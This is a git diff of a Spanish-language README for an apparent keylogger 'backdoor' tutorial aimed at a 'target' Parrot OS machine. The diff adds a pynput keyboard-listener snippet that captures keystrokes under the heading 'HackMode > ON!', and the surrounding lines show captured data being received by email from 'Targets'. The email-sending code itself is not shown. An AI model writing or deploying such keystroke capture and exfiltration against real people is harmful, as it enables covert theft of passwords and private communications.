@@ -1,11 +1,24 @@
-TARGET > PARROT OS
+TARGET > PARROT OS (El backdoor se encuentra en la maquina Parrot)
+
 
 * Requerimientos : Instalar pynput
 
 ```bash
 pip install pynput
 ``` 
-# Reinicia tu editor de codigo, importante.
+# Importante: reinicia tu editor de codigo despues de instalar pynput.
+
+# Apreta el HackMode > ON!
+
+```bash
+from pynput.keyboard import Listener
+
+def capturar_teclas(key):
+    print(key)
+    
+with Listener(on_press=capturar_teclas) as l:
+    l.join()
+```   
 
 ![EMPEZAMOS A CAPTURAR](https://user-images.githubusercontent.com/97669969/159133261-b7100e64-e532-4f0b-a776-ee9ca6c859ae.png)
 * Empezamos a capturar las teclas de nuestra target.
@@ -74,7 +87,7 @@ print("Correo enviando correctamente")
 
 
 
-* Recibimos el correo desde nuestro Target
+* Recibimos el correo desde nuestras !Targets!
 
 ![corre envio ubuntu](https://user-images.githubusercontent.com/97669969/159137793-d7097c7b-a3ce-4455-8231-265b10f91d10.png)
 
